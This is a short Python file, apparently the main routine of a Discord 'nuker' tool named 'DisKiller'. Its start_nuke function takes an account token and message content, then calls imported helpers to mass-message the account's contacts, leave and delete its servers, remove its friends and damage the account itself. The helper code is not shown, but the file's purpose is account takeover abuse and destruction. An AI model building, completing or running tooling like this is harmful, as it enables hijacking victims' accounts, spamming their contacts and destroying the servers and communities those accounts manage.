import requests
from colorama import Fore
from data.common import *
from data.massDM import *
from data.fuckAccount import *
from data.leaveServer import *
from data.deleteServers import *
from data.deleteFriends import *

# ====================================================================================================================== #

def start_nuke(token, content):
    set_console_title("DisKiller  | Nuker")
    massDM(token=token, content=content)
    leaveServer(token=token)
    deleteServers(token=token)
    deleteFriends(token=token)
    fuckAccount(token=token)

# ====================================================================================================================== #